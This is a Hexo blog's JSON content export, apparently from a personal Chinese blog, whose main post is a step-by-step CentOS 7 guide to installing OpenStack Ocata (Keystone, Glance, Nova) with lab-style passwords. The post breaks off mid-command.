{"meta":{"title":"欧阳博客","subtitle":"三分孤独,七分狂傲","description":"欧阳博客,欧阳SEO,欧阳网络,5658,5658.pw,ddos,黑客,欧阳工作室,欧阳社区,欧阳论坛,欧阳家族,欧阳,挖矿","author":"欧阳 Blog","url":"https://www.5658.pw"},"pages":[{"title":"About","date":"2018-09-28T13:06:12.000Z","updated":"2018-11-22T15:55:48.264Z","comments":true,"path":"about/index.html","permalink":"https://www.5658.pw/about/index.html","excerpt":"","text":"Info简介： Z城中的一位流浪者 : )性别： MaleE-mail：dash6@foxmail.com任世间争吵不断，我依旧清风不改。 other喜欢独身一人与那孤独又漆黑的夜晚作伴,同那寂静的黑夜中共鸣,与那静穆的黑夜聊天; 敲键百日,用站一时。初建Hexo博客,如发现有需要改善的地方,望大家不惜吝教。"},{"title":"Categories","date":"2018-09-28T13:10:54.000Z","updated":"2018-10-04T14:20:28.174Z","comments":false,"path":"categories/index.html","permalink":"https://www.5658.pw/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2018-09-28T13:10:42.000Z","updated":"2018-10-04T14:20:46.424Z","comments":false,"path":"tags/index.html","permalink":"https://www.5658.pw/tags/index.html","excerpt":"","text":""},{"title":"小伙伴","date":"2018-10-03T13:59:51.000Z","updated":"2019-05-17T13:56:18.378Z","comments":true,"path":"buddy/index.html","permalink":"https://www.5658.pw/buddy/index.html","excerpt":"","text":"友链Don Lex&nbsp;&nbsp;&nbsp;&nbsp;Shawn’s Blog&nbsp;&nbsp;&nbsp;&nbsp;千羽哲学♂课堂&nbsp;&nbsp;&nbsp;&nbsp;晓月斋&nbsp;&nbsp;&nbsp;&nbsp;故事熊yi-yun&nbsp;&nbsp;&nbsp;&nbsp;ChungZH’s blog&nbsp;&nbsp;&nbsp;&nbsp;keithx的博客~&nbsp;&nbsp;&nbsp;&nbsp;随遇而安&nbsp;&nbsp;&nbsp;&nbsp;AquanBlogJoyace&nbsp;&nbsp;&nbsp;&nbsp;低调小熊猫&nbsp;&nbsp;&nbsp;&nbsp;TRHX&nbsp;&nbsp;&nbsp;&nbsp;shansan&nbsp;&nbsp;&nbsp;&nbsp;三尺博客&nbsp;&nbsp;&nbsp;&nbsp;yue_luo‘sQupid and Monkey’s Blog&nbsp;&nbsp;&nbsp;&nbsp;YOHUA&nbsp;&nbsp;&nbsp;&nbsp;待添加&nbsp;&nbsp;&nbsp;&nbsp;待添加&nbsp;&nbsp;&nbsp;&nbsp;待添加&nbsp;&nbsp;&nbsp;&nbsp; 交换友链请在下方留言哦~~~❤ 拒绝推广类广告网站，抵制一切非法网站淫秽网站等；❤ 本站所加的友情链接，如发现其失效持续超过一周，将直接取消贵链接，如果恢复，请留言❤ 申请之前请先提前对本站博客做好友情链接❤ 本博客只提供文字友链不提供LOGO友链❤ 未受到搜索引擎惩罚，即在百度、Google中能搜索到贵站❤ 我们只交换首页友情链接,非首页链接申请不通过(个别除外)❤ 要求贵站页面设计整洁，友情链接清晰不乱，并且链接保持在页面首页，内容健康，不接受广告联盟、营销网站之类站点的链接，网站内容符合中华人民共和国法律，制作不能太粗糙，无恶意代码。(个别除外)❤没有满足以上条件的请勿打扰！ 格式Name:欧阳博客URL:https://5658.pwlogo:https://5658.pw/images/avatar.pngIntroduce:三分孤独,七分狂傲"},{"title":"继老博客常用功能","date":"2018-10-02T05:59:47.000Z","updated":"2018-10-25T17:23:20.054Z","comments":true,"path":"entertainment/index.html","permalink":"https://www.5658.pw/entertainment/index.html","excerpt":"介绍老版本博客上大家常用的功能我也会移上来的","text":"介绍老版本博客上大家常用的功能我也会移上来的 功能曼茶罗&nbsp;&nbsp;&nbsp;捕鱼达人&nbsp;&nbsp;&nbsp;云视频&nbsp;&nbsp;&nbsp;飞机大战&nbsp;&nbsp;&nbsp;2048花式扑克&nbsp;&nbsp;&nbsp;滑稽狗&nbsp;&nbsp;&nbsp;别踩白块&nbsp;&nbsp;&nbsp;炫酷的键盘&nbsp;&nbsp;&nbsp;弹射烟花炫酷的光效&nbsp;&nbsp;&nbsp;炫酷的粒子&nbsp;&nbsp;&nbsp;一起挖矿吧"}],"posts":[{"title":"Centos7 搭建openstack ocata 版","slug":"Centos7-搭建openstack-ocata-版","date":"2019-05-11T05:21:57.000Z","updated":"2019-05-11T05:42:06.151Z","comments":true,"path":"2019/05/11/Centos7-搭建openstack-ocata-版/","link":"","permalink":"https://www.5658.pw/2019/05/11/Centos7-搭建openstack-ocata-版/","excerpt":"一、openstack 介绍 123456789101112131415161718192021OpenStack是一个由NASA（美国国家航空航天局）和Rackspace合作研发并发起的，以Apache许可证授权的自由软件和开放源代码项目。OpenStack是一个开源的云计算管理平台项目，由几个主要的组件组合起来完成具体工作。OpenStack支持几乎所有类型的云环境，项目目标是提供实施简单、可大规模扩展、丰富、标准统一的云计算管理平台。OpenStack通过各种互补的服务提供了基础设施即服务（IaaS）的解决方案，每个服务提供API以进行集成。OpenStack是一个旨在为公共及私有云的建设与管理提供软件的开源项目。它的社区拥有超过130家企业及1350位开发者，这些机构与个人都将OpenStack作为基础设施即服务（IaaS）资源的通用前端。OpenStack项目的首要任务是简化云的部署过程并为其带来良好的可扩展性。本文希望通过提供必要的指导信息，帮助大家利用OpenStack前端来设置及管理自己的公共云或私有云。OpenStack云计算平台，帮助服务商和企业内部实现类似于 Amazon EC2 和 S3 的云基础架构服务(Infrastructure as a Service, IaaS)。OpenStack 包含两个主要模块：Nova 和 Swift，前者是 NASA 开发的虚拟服务器部署和业务计算模块；后者是 Rackspace开发的分布式云存储模块，两者可以一起用，也可以分开单独用。OpenStack除了有 Rackspace 和 NASA 的大力支持外，还有包括 Dell、Citrix、 Cisco、 Canonical等重量级公司的贡献和支持，发展速度非常快，有取代另一个业界领先开源云平台 Eucalyptus 的态势。","text":"一、openstack 介绍 123456789101112131415161718192021OpenStack是一个由NASA（美国国家航空航天局）和Rackspace合作研发并发起的，以Apache许可证授权的自由软件和开放源代码项目。OpenStack是一个开源的云计算管理平台项目，由几个主要的组件组合起来完成具体工作。OpenStack支持几乎所有类型的云环境，项目目标是提供实施简单、可大规模扩展、丰富、标准统一的云计算管理平台。OpenStack通过各种互补的服务提供了基础设施即服务（IaaS）的解决方案，每个服务提供API以进行集成。OpenStack是一个旨在为公共及私有云的建设与管理提供软件的开源项目。它的社区拥有超过130家企业及1350位开发者，这些机构与个人都将OpenStack作为基础设施即服务（IaaS）资源的通用前端。OpenStack项目的首要任务是简化云的部署过程并为其带来良好的可扩展性。本文希望通过提供必要的指导信息，帮助大家利用OpenStack前端来设置及管理自己的公共云或私有云。OpenStack云计算平台，帮助服务商和企业内部实现类似于 Amazon EC2 和 S3 的云基础架构服务(Infrastructure as a Service, IaaS)。OpenStack 包含两个主要模块：Nova 和 Swift，前者是 NASA 开发的虚拟服务器部署和业务计算模块；后者是 Rackspace开发的分布式云存储模块，两者可以一起用，也可以分开单独用。OpenStack除了有 Rackspace 和 NASA 的大力支持外，还有包括 Dell、Citrix、 Cisco、 Canonical等重量级公司的贡献和支持，发展速度非常快，有取代另一个业界领先开源云平台 Eucalyptus 的态势。 官方文档地址：https://docs.openstack.org/ocata/install-guide-rdo/glance-install.html&gt; 二、基础环境123456789101112131415系统版本： Centos7.3 两块网卡(eth0,eth1)机器的配置： 4G 50G硬盘（两块） 4个CPU机器名： linux-node1（计算节点）机器名： linux-node2（控制节点）Node2 IP：eth0 192.168.57.145， eth1:192.168.57.146Node1IP: eth0: 192.168.57.142 eth1:192.168.57.143主控制节点主要安装如下：（keystone、Glance、nova、networking、Dashboard）计算节点主要安装如下：（nova、networking） 2.1 时间同步（node1 +node2 操作）https://docs.openstack.org/ocata/install-guide-rdo/glance-install.html 12345678910111213141516171819node1 # yum install chronyvim /etc/chrony.conf设置allow 192.168.57.0/24####启动[root@linux-node2 ~]# systemctl enable chronyd.service[root@linux-node2 ~]#systemctl start chronyd.service########node1 的时间先同步一下标准时间[root@linux-node2 ~]# ntpdate pool.ntp.org# chronyc sourcesnode2 修改主配置文件vim /etc/chrony.conf把所有行去掉添加一行Server 192.168.57.145 iburst[root@linux-node2 ~]#systemctl start chronyd.service# chronyc sources 2.2 安装mysql（node2主控制节点操作）*配置一下mysql 添加文件/etc/my.cnf.d/openstack.cnf 内容如下： 1234567 [mysqld]bind-address = 192.168.57.145default-storage-engine = innodbinnodb_file_per_tablecollation-server =utf8_general_ciinit-connect = 'SET NAMES utf8'character-set-server = utf8 重启一下mysql 12[root@linux-node2 ~]# systemctl enable mariadb.service[root@linux-node2 ~]# systemctl start mariadb.service 设置root密码 1[root@linux-node2 ~]# mysql_secure_installation 创建数据库 123[root@linux-node2 ~]# mysql -uroot -p123456 -e \"Create database keystone;\"[root@linux-node2 ~]# mysql -uroot -p123456 -e \"grant all privileges on keystone.* to 'keystone'@'%' identified by 'keystone'\"[root@linux-node2 ~]# mysql -uroot -p123456 -e \"grant all privileges on keystone.* to 'keystone'@'localhost' identified by 'keystone'\" 2.3 安装消息队列（node2控制节点操作）1# yum install rabbitmq-server 启动 12# systemctl enable rabbitmq-server.service# systemctl start rabbitmq-server.service 新建用户 1# rabbitmqctl add_user openstack openstack 对用户授权 1rabbitmqctl set_permissions openstack \".*\" \".*\" \".*\" 查看插件 12345678910111213141516171819202122232425[root@linux-node2 ~]# rabbitmq-plugins list[ ] amqp_client 3.3.5[ ] cowboy 0.5.0-rmq3.3.5-git4b93c2d[ ] eldap 3.3.5-gite309de4[ ] mochiweb 2.7.0-rmq3.3.5-git680dba8[ ] rabbitmq_amqp1_0 3.3.5[ ] rabbitmq_auth_backend_ldap 3.3.5[ ] rabbitmq_auth_mechanism_ssl 3.3.5[ ] rabbitmq_consistent_hash_exchange 3.3.5[ ] rabbitmq_federation 3.3.5[ ] rabbitmq_federation_management 3.3.5[ ] rabbitmq_management 3.3.5[ ] rabbitmq_management_agent 3.3.5[ ] rabbitmq_management_visualiser 3.3.5[ ] rabbitmq_mqtt 3.3.5[ ] rabbitmq_shovel 3.3.5[ ] rabbitmq_shovel_management 3.3.5[ ] rabbitmq_stomp 3.3.5[ ] rabbitmq_test 3.3.5[ ] rabbitmq_tracing 3.3.5[ ] rabbitmq_web_dispatch 3.3.5[ ] rabbitmq_web_stomp 3.3.5[ ] rabbitmq_web_stomp_examples 3.3.5[ ] sockjs 0.3.4-rmq3.3.5-git3132eb9[ ] webmachine 1.10.3-rmq3.3.5-gite9359c7 启用web插件 1[root@linux-node2 ~]# rabbitmq-plugins enable rabbitmq_management 重启一下 1[root@linux-node2 ~]# systemctl restart rabbitmq-server.service 检查是否启动成功 12345[root@linux-node2 ~]# netstat -nltp |grep 5672tcp 0 0 0.0.0.0:15672 0.0.0.0:* LISTEN 16686/beam.smp tcp 0 0 0.0.0.0:25672 0.0.0.0:* LISTEN 16686/beam.smp tcp6 0 0 :::5672 :::* LISTEN 16686/beam.smp [root@linux-node2 ~]# Web访问 http://192.168.57.138:15672/#/ 用户名密码为guest 三、搭建openstack3.1 安装keystone 组件介绍Keystone功能： 1. 用户与认证: 用户权限与用户行为跟踪 2. 服务目录：提供一个服务目录、包括所有服务项与相关API的端点 1234567Keystone名词：User： 用户Tenant： 租户/项目Token： 令牌Role： 角色Service： 服务Endpoint： 端点 3.2 安装keystone 组件（node2 主控制节点操作）1234567安装openstack最新的源： #yum install centos-release-openstack-ocata #yum install https://rdoproject.org/repos/rdo-release.rpm #yum upgrade (在主机上升级包） #yum install python-openstackclient （安装opentack必须的插件） #yum install openstack-selinux （可选则安装这个插件，我直接关闭了selinux，因为不熟，对后续不会有影响） [root@linux-node1 home]# yum install openstack-keystone httpd mod_wsgi 3.2.1修改配置文件12345vim /etc/keystone/keystone.conf[database]connection = mysql://keystone:keystone@192.168.57.145/keystone [token]provider = fernet 3.2.2同步数据库123456su -s /bin/sh -c \"keystone-manage db_sync\" keystone###为什么需要su 一下呢？因为在写日志的时候文件是放在/var/log/keystone 这个下面如果是root用户执行的话。那么写日志的时候就会写不进去。验证一下是否成功。进入数据库查看有没有表的建立。MariaDB [keystone]&gt; show tables;+------------------------+| Tables_in_keystone | 初始化 12# keystone-manage fernet_setup --keystone-user keystone --keystone-group keystone# keystone-manage credential_setup --keystone-user keystone --keystone-group keystone 引导身份信息 12345keystone-manage bootstrap --bootstrap-password admin \\ --bootstrap-admin-url http://linux-node2:35357/v3/ \\ --bootstrap-internal-url http://linux-node2:5000/v3/ \\ --bootstrap-public-url http://linux-node2:5000/v3/ \\ --bootstrap-region-id RegionOne 3.2.3配置memcache的配置 （**/etc/sysconfig/memcached**）12vim /etc/sysconfig/memcachedOPTIONS=\"-l 127.0.0.1,::1,192.168.57.145\" 3.2.4启动memcache1234[root@linux-node2 ~]# systemctl start memcached.service [root@linux-node2 ~]# netstat -nltp|grep 121tcp 0 0 0.0.0.0:11211 0.0.0.0:* LISTEN 20054/memcached tcp6 0 0 :::11211 :::* LISTEN 20054/memcached 3.2.5设置apache1ln -s /usr/share/keystone/wsgi-keystone.conf /etc/httpd/conf.d/ 3.2.6修改主apache的主配置文件123vim /etc/httpd/conf/httpd.conf配置一下ServernameServerName 192.168.57.145:80 3.2.7启动apache12systemctl enable httpd.servicesystemctl start httpd.service 3.2.8检查一下是否启动成功了12345[root@linux-node2 conf.d]# netstat -nltp|grep httpdtcp6 0 0 :::80 :::* LISTEN 20253/httpd tcp6 0 0 :::35357 :::* LISTEN 20253/httpd tcp6 0 0 :::5000 :::* LISTEN 20253/httpd [root@linux-node2 conf.d]# 3.3 keystone 用户权限3.3.1 设置环境变量1234567$ export OS_USERNAME=admin$ export OS_PASSWORD=admin$ export OS_PROJECT_NAME=admin$ export OS_USER_DOMAIN_NAME=Default$ export OS_PROJECT_DOMAIN_NAME=Default$ export OS_AUTH_URL=http://linux-node2:35357/v3$ export OS_IDENTITY_API_VERSION=3 3.3.2创建域、项目、用户和角色123456789101112创建服务[root@linux-node2 ~]# openstack project create --domain default --description \"Service Project\" service创建demo项目 [root@linux-node2 ~]# openstack project create --domain default \\&gt; --description \"Demo Project\" demo设置demo密码[root@linux-node2 ~]# openstack user create --domain default \\&gt; --password-prompt demo创建用户组 [root@linux-node2 ~]# openstack role create user加入用户组 [root@linux-node2 ~]# openstack role add --project demo --user demo user 3.3.3**验证操作**\\1. 出于安全原因，请禁用临时身份验证令牌机制： ( 这个可以不操作) 1编辑/etc/keystone/keystone-paste.ini 文件并删除admin_token_auth从 [pipeline:public_api]，[pipeline:admin_api]和[pipeline:api_v3]段。 2、取消设置临时 变量OS_AUTH_URL和OS_PASSWORD环境变量： 1[root@linux-node2 ~]# unset OS_AUTH_URL OS_PASSWORD 3、作为admin 、请求身份验证令牌 1234567891011121314$ openstack --os-auth-url http://linux-node2:35357/v3 \\ --os-project-domain-name default --os-user-domain-name default \\ --os-project-name admin --os-username admin token issuePassword:+------------+-----------------------------------------------------------------+| Field | Value |+------------+-----------------------------------------------------------------+| expires | 2016-02-12T20:14:07.056119Z || id | gAAAAABWvi7_B8kKQD9wdXac8MoZiQldmjEO643d-e_j-XXq9AmIegIbA7UHGPv || | atnN21qtOMjCFWX7BReJEQnVOAj3nclRQgAYRsfSU_MrsuWb4EDtnjU7HEpoBb4 || | o6ozsA_NmFWEpLeKy0uNn_WeKbAhYygrsmQGA49dclHVnz-OMVLiyM9ws || project_id | 343d245e850143a096806dfaefa9afdc || user_id | ac3377633149401296f6c0d92d79dc16 |+------------+-----------------------------------------------------------------+ 4、用demo用户、请求验证令牌 12345678910111213$ openstack --os-auth-url http://linux-node2:5000/v3 \\ --os-project-domain-name default --os-user-domain-name default \\ --os-project-name demo --os-username demo token issuePassword:+------------+-----------------------------------------------------------------+| Field | Value |+------------+-----------------------------------------------------------------+| expires | 2016-02-12T20:15:39.014479Z || id | gAAAAABWvi9bsh7vkiby5BpCCnc-JkbGhm9wH3fabS_cY7uabOubesi-Me6IGWW || | yQqNegDDZ5jw7grI26vvgy1J5nCVwZ_zFRqPiz_qhbq29mgbQLglbkq6FQvzBRQ || | JcOzq3uwhzNxszJWmzGC7rJE_H0A_a3UFhqv8M4zMRYSbS2YF0MyFmp_U || project_id | ed0b60bf607743088218b0a533d5943f || user_id | 58126687cbcc4888bfa9ab73a2256f27 | 3.3.4**创建 OpenStack 客户端环境脚本**vi admin-openrc 加入如下： 12345678export OS_PROJECT_DOMAIN_NAME=Defaultexport OS_USER_DOMAIN_NAME=Defaultexport OS_PROJECT_NAME=adminexport OS_USERNAME=adminexport OS_PASSWORD=ADMIN_PASSexport OS_AUTH_URL=http://linux-node2:35357/v3export OS_IDENTITY_API_VERSION=3export OS_IMAGE_API_VERSION=2 #vi demo-openrc 加入： 123456789[root@linux-node2 ~]# cat demo-openrc export OS_PROJECT_DOMAIN_NAME=Defaultexport OS_USER_DOMAIN_NAME=Defaultexport OS_PROJECT_NAME=demoexport OS_USERNAME=demoexport OS_PASSWORD=demoexport OS_AUTH_URL=http://linux-node2:5000/v3export OS_IDENTITY_API_VERSION=3export OS_IMAGE_API_VERSION=2 四**：镜像服务**Glance（node2 主控制节点操作）4.1 Glance 介绍Glance 主要由三个部分构成： glance-api、glance-registry 以 image stroe Glance-api：接受云系统镜像创建、删除、读取请求 Glance-Registry： 云系统镜像注册服务 4.2 mysql 配置123456$ mysql -u root –pMariaDB [(none)]&gt; CREATE DATABASE glance;MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON glance.* TO 'glance'@'localhost' \\ IDENTIFIED BY 'glance';MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON glance.* TO 'glance'@'%' \\ IDENTIFIED BY 'glance'; 4.3 Glance安装1# yum install openstack-glance 4.4修改主配置文件**/etc/glance/glance-api.conf**1234567891011121314151617181920212223242526[database]# ...connection = mysql://glance:glance@192.168.57.145/glance在[keystone_authtoken]和[paste_deploy]部分中，配置身份服务访问：[keystone_authtoken] auth_uri = http://linux-node2:5000auth_url = http://linux-node2:35357memcached_servers = linux-node2:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = glancepassword = glance #########这里的密码就是下面的新建 API glance用户的密码＃... [paste_deploy]flavor = keystone[glance_store]# ...stores = file,httpdefault_store = filefilesystem_store_datadir = /var/lib/glance/images/ 4.5 修改主配置文件**/etc/glance/glance-registry.conf**123[database]# ...connection = mysql://glance:glance@192.168.57.145/glance 在[keystone_authtoken]和[paste_deploy]部分中，配置身份服务访问： 12345678910111213[keystone_authtoken] auth_uri = http://linux-node2:5000auth_url = http://linux-node2:35357memcached_servers = linux-node2:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = glancepassword = glance #########这里的密码就是下面的新建 API glance用户的密码＃... [paste_deploy]flavor = keystone 4.6 设置数据库1# su -s /bin/sh -c \"glance-manage db_sync\" glance 4.7创建镜像服务的API服务12345678910$ openstack user create --domain default --password-prompt glance$ openstack role add --project service --user glance admin$ openstack service create --name glance \\ --description \"OpenStack Image\" image$ openstack endpoint create --region RegionOne \\ image public http://linux-node2:9292$ openstack endpoint create --region RegionOne \\ image internal http://linux-node2:9292$ openstack endpoint create --region RegionOne \\ image admin http://linux-node2:9292 4.8 启动服务1234# systemctl enable openstack-glance-api.service \\ openstack-glance-registry.service# systemctl start openstack-glance-api.service \\ openstack-glance-registry.service 4.9验证1234运行环境变量： #. admin-openrc 下载一个比较小的镜像： #wget http://download.cirros-cloud.net/0.3.5/cirros-0.3.5-x86_64-disk.img 一、上传文件 1234567891011121314151617181920212223242526$ openstack image create \"cirros\" \\ --file cirros-0.3.5-x86_64-disk.img \\ --disk-format qcow2 --container-format bare \\ --public+------------------+------------------------------------------------------+| Field | Value |+------------------+------------------------------------------------------+| checksum | 133eae9fb1c98f45894a4e60d8736619 || container_format | bare || created_at | 2015-03-26T16:52:10Z || disk_format | qcow2 || file | /v2/images/cc5c6982-4910-471e-b864-1098015901b5/file || id | cc5c6982-4910-471e-b864-1098015901b5 || min_disk | 0 || min_ram | 0 || name | cirros || owner | ae7a98326b9c455588edd2656d723b9d || protected | False || schema | /v2/schemas/image || size | 13200896 || status | active || tags | || updated_at | 2015-03-26T16:52:10Z || virtual_size | None || visibility | public |+------------------+------------------------------------------------------+ 二、查看 1234567$ openstack image list+--------------------------------------+--------+--------+| ID | Name | Status |+--------------------------------------+--------+--------+| 38047887-61a7-41ea-9b49-27987d5e8bb9 | cirros | active |+--------------------------------------+--------+--------+ 有输出证明glance配置正确 五、计算服务一 nova（node2控制节点操作）5 .**N**ova 作用\\1. API :负责接收和相应外部请求、支持 openstack API Ec2API \\2. Cert：负责身份认证 \\3. Scheduler：用于云主机调度 \\4. Conductor： 计算节点访问数据的中间件 \\5. Consoleaut：用于控制台的授权验证 \\6. NovncProxy： VNC代理 5.1 新建数据库1234567891011$ mysql -u root –pMariaDB [(none)]&gt; CREATE DATABASE nova_api;MariaDB [(none)]&gt; CREATE DATABASE nova;MariaDB [(none)]&gt; CREATE DATABASE nova_cell0;新建用户MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON nova_api.* TO 'nova'@'%' \\ IDENTIFIED BY 'nova';MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON nova.* TO 'nova'@'localhost' \\ IDENTIFIED BY 'nova';MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON nova_cell0.* TO 'nova'@'%' \\ IDENTIFIED BY 'nova'; 5.2**创建nova用户：**12345678910111213141516171819# . admin-openrcopenstack user create --domain default --password-prompt novaUser Password: novaRepeat User Password: novaThe passwords entered were not the sameUser Password: novaRepeat User Password: nova+---------------------+----------------------------------+| Field | Value |+---------------------+----------------------------------+| domain_id | default || enabled | True || id | b9878680c70a4a678fd9a7a580706ccf || name | nova || options | &#123;&#125; || password_expires_at | None |+---------------------+----------------------------------+[root@linux-node2 ~]# 加入组 1[root@linux-node2 ~]# openstack role add --project service --user nova admin 5.3创建nova服务实体123456789101112$ openstack service create --name nova \\ --description \"OpenStack Compute\" compute+-------------+----------------------------------+| Field | Value |+-------------+----------------------------------+| description | OpenStack Compute || enabled | True || id | 060d59eac51b4594815603d75a00aba2 || name | nova || type | compute |+-------------+----------------------------------+ 5.4创建服务API123456789101112131415161718192021222324252627282930313233343536373839404142434445[root@linux-node2 ~]# openstack endpoint create --region RegionOne \\&gt; compute public http://linux-node2:8774/v2.1+--------------+----------------------------------+| Field | Value |+--------------+----------------------------------+| enabled | True || id | b6ebf975780344a597a65650eafdf67a || interface | public || region | RegionOne || region_id | RegionOne || service_id | d6a1591a15944bea85ab1e203af6732c || service_name | nova || service_type | compute || url | http://linux-node2:8774/v2.1 |+--------------+----------------------------------+[root@linux-node2 ~]# openstack endpoint create --region RegionOne \\&gt; compute internal http://linux-node2:8774/v2.1+--------------+----------------------------------+| Field | Value |+--------------+----------------------------------+| enabled | True || id | a2c1af804a31484cb3d82017b15fa47f || interface | internal || region | RegionOne || region_id | RegionOne || service_id | d6a1591a15944bea85ab1e203af6732c || service_name | nova || service_type | compute || url | http://linux-node2:8774/v2.1 |+--------------+----------------------------------+[root@linux-node2 ~]# openstack endpoint create --region RegionOne \\&gt; compute admin http://linux-node2:8774/v2.1+--------------+----------------------------------+| Field | Value |+--------------+----------------------------------+| enabled | True || id | 0304b6e92bf049d09e7d28bacfb1ed16 || interface | admin || region | RegionOne || region_id | RegionOne || service_id | d6a1591a15944bea85ab1e203af6732c || service_name | nova || service_type | compute || url | http://linux-node2:8774/v2.1 |+--------------+----------------------------------+ 5.5新建另一个用户1234567891011121314[root@linux-node2 ~]# openstack user create --domain default --password-prompt placementUser Password: nova Repeat User Password: nova+---------------------+----------------------------------+| Field | Value |+---------------------+----------------------------------+| domain_id | default || enabled | True || id | 1654b6d199bf4fc582d1e70db802a31a || name | placement || options | &#123;&#125; || password_expires_at | None |+---------------------+----------------------------------+[root@linux-node2 ~]# 加入管理员组 1[root@linux-node2 ~]# openstack role add --project service --user placement admin 5.6**在服务目录中创建Placement API条目：**12345678910$ openstack service create --name placement --description \"Placement API\" placement+-------------+----------------------------------+| Field | Value |+-------------+----------------------------------+| description | Placement API || enabled | True || id | 2d1a27022e6e4185b86adac4444c495f || name | placement || type | placement |+-------------+----------------------------------+ 5.7**创建Placement API服务端点：**123456789101112131415161718192021222324252627282930313233343536373839404142[root@linux-node2 ~]# openstack endpoint create --region RegionOne placement public http://linux-node2:8778+--------------+----------------------------------+| Field | Value |+--------------+----------------------------------+| enabled | True || id | 4b82fb4b30de4228982dea8c663f6d26 || interface | public || region | RegionOne || region_id | RegionOne || service_id | ba2a8b23524a4635af583cbfc80abd91 || service_name | placement || service_type | placement || url | http://linux-node2:8778 |+--------------+----------------------------------+[root@linux-node2 ~]# openstack endpoint create --region RegionOne placement internal http://linux-node2:8778+--------------+----------------------------------+| Field | Value |+--------------+----------------------------------+| enabled | True || id | bea3dbb6003d4cea802527de411f8cde || interface | internal || region | RegionOne || region_id | RegionOne || service_id | ba2a8b23524a4635af583cbfc80abd91 || service_name | placement || service_type | placement || url | http://linux-node2:8778 |+--------------+----------------------------------+[root@linux-node2 ~]# openstack endpoint create --region RegionOne placement admin http://linux-node2:8778+--------------+----------------------------------+| Field | Value |+--------------+----------------------------------+| enabled | True || id | b5d6d62d8f3f4e7c9ee2d6241b832bc5 || interface | admin || region | RegionOne || region_id | RegionOne || service_id | ba2a8b23524a4635af583cbfc80abd91 || service_name | placement || service_type | placement || url | http://linux-node2:8778 |+--------------+----------------------------------+ 5.8**安装和配置的部件**123# yum install openstack-nova-api openstack-nova-conductor \\ openstack-nova-console openstack-nova-novncproxy \\ openstack-nova-scheduler openstack-nova-placement-api 5.9修改配置文件 /etc/nova/nova.conf12345678910[DEFAULT]# ...enabled_apis = osapi_compute,metadata [api_database]connection=mysql://nova:nova@192.168.57.145/nova_api[database]connection=connection=mysql://nova:nova@192.168.57.145/nova[DEFAULT]# ...transport_url = rabbit://openstack:openstack@192.168.57.145 5.10设置api和连接信息12345678910111213141516171819202122232425262728[api]# ...auth_strategy = keystone[keystone_authtoken]# ...auth_uri = http://linux-node2:5000auth_url = http://linux-node2:35357memcached_servers = linux-node2:11211 auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = novapassword = nova设置IP[DEFAULT]# ...my_ip = 192.168.57.145[DEFAULT]# ...use_neutron = Truefirewall_driver = nova.virt.firewall.NoopFirewallDriver[vnc]enabled = true# ...vncserver_listen = $my_ipvncserver_proxyclient_address = $my_ip 5.11设置glance123[glance]# ...api_servers = http://linux-node2:9292 5.12设置**[oslo_concurrency]**123[oslo_concurrency]# ...lock_path = /var/lib/nova/tmp 5.13设置**[placement]**12345678910[placement]# ... os_region_name = RegionOneproject_domain_name = Defaultproject_name = serviceauth_type = passworduser_domain_name = Defaultauth_url = http://linux-node2:35357/v3username = placementpassword = nova 5.14设置apachevim /etc/httpd/conf.d/00-nova-placement-api.conf: 123456789&lt;Directory /usr/bin&gt; &lt;IfVersion &gt;= 2.4&gt; Require all granted &lt;/IfVersion&gt; &lt;IfVersion &lt; 2.4&gt; Order allow,deny Allow from all &lt;/IfVersion&gt;&lt;/Directory&gt; 5.15重启apache1# systemctl restart httpd 填充nova-api数据库： 1# su -s /bin/sh -c \"nova-manage api_db sync\" nova 注册cell0数据库： 1# su -s /bin/sh -c \"nova-manage cell_v2 map_cell0\" nova 创建cell1单元格： 12# su -s /bin/sh -c \"nova-manage cell_v2 create_cell --name=cell1 --verbose\" nova109e1d4b-536a-40d0-83c6-5f121b82b650 填充nova数据库： 1# su -s /bin/sh -c \"nova-manage db sync\" nova 5.17验证验证nova cell0和cell1是否正确注册： 1234567891011121314151617181920＃ nova-manage cell_v2 list_cells + ------- + ----------------------------------- --- + | 名称| UUID | + ------- + -------------------------------------- + | cell1 | 109e1d4b-536a-40d0-83c6-5f121b82b650 | | cell0 | 00000000-0000-0000-0000-000000000000 | + ------- + -------------------------------------- +设置开机自启动[root@linux-node2 nova]# systemctl enable openstack-nova-api.service[root@linux-node2 nova]# systemctl enable openstack-nova-consoleauth.service[root@linux-node2 nova]# systemctl enable openstack-nova-scheduler.service[root@linux-node2 nova]# systemctl enable openstack-nova-conductor.service [root@linux-node2 nova]# systemctl enable openstack-nova-novncproxy.service[root@linux-node2 nova]#启动服务[root@linux-node2 nova]# systemctl start openstack-nova-api.service[root@linux-node2 nova]# systemctl start openstack-nova-consoleauth.service[root@linux-node2 nova]# systemctl start openstack-nova-scheduler.service[root@linux-node2 nova]# systemctl start openstack-nova-conductor.service [root@linux-node2 nova]# systemctl start openstack-nova-novncproxy.service 六、计算服务二 nova（node1计算节点操作）6.1安装nova-compute1# yum install openstack-nova-compute 6.2配置主配置文件（**/etc/nova/nova.conf**）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[DEFAULT]# ...enabled_apis = osapi_compute,metadata[DEFAULT]# ...transport_url = rabbit://openstack:openstack@192.168.57.145[api]# ...auth_strategy = keystone[keystone_authtoken]# ...auth_uri = http://linux-node2:5000auth_url = http://linux-node2:35357memcached_servers = linux-node2:11211auth_type = passwordproject_domain_name = defaultuser_domain_name = defaultproject_name = serviceusername = novapassword = nova[DEFAULT]# ...my_ip = 192.168.57.142 ########这个是本机IP[DEFAULT]# ...use_neutron = Truefirewall_driver = nova.virt.firewall.NoopFirewallDriver[vnc]# ...enabled = Truevncserver_listen = 0.0.0.0vncserver_proxyclient_address = $my_ipnovncproxy_base_url = http://linux-node2:6080/vnc_auto.html[glance]# ...api_servers = http://linux-node2:9292[oslo_concurrency]# ...lock_path = /var/lib/nova/tmp[placement]# ...os_region_name = RegionOneproject_domain_name = Defaultproject_name = serviceauth_type = passworduser_domain_name = Defaultauth_url = http://linux-node2:35357/v3username = placementpassword = nova 6.3检查是否需要硬件加速1$ egrep -c 